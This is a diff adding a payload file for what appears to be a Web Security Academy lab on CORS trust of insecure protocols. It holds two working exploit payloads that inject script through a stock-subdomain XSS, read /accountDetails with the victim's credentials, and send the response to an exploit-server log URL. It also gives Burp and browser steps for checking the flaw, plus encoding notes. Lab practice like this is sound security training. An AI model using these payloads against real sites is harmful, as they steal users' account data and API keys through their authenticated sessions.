@@ -1,1 +1,36 @@
-payload template
+# ============================================================
+# CORS Trusted Insecure Protocols — Payloads
+# ============================================================
+
+# ── PAYLOAD 1: Final working exploit (host on exploit server) ─────────────────
+<script>
+  document.location="http://stock.LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+
+# ── PAYLOAD 2: Using fetch() inside the XSS payload ──────────────────────────
+<script>
+  document.location="http://stock.LAB-ID.web-security-academy.net/?productId=4<script>fetch('https://LAB-ID.web-security-academy.net/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>{location='https://EXPLOIT-ID.exploit-server.net/log?key='%2bencodeURIComponent(d)});%3c/script>&storeId=1"
+</script>
+
+
+# ── VERIFY XSS manually (browser URL bar) ────────────────────────────────────
+http://stock.LAB-ID.web-security-academy.net/?productId=4<script>alert(document.domain)</script>&storeId=1
+# If alert fires showing stock subdomain → XSS confirmed
+
+
+# ── VERIFY CORS manually (Burp Repeater) ─────────────────────────────────────
+GET /accountDetails HTTP/1.1
+Host: LAB-ID.web-security-academy.net
+Cookie: session=YOUR_SESSION
+Origin: http://stock.LAB-ID.web-security-academy.net
+
+# Expected response:
+# Access-Control-Allow-Origin: http://stock.LAB-ID.web-security-academy.net
+# Access-Control-Allow-Credentials: true
+
+
+# ── URL ENCODING REFERENCE ───────────────────────────────────────────────────
+# %2b  →  +   (string concatenation — raw + breaks URL)
+# %3c  →  <   (closing </script> tag — raw < closes script block early)
+# These two are REQUIRED for the payload to work correctly
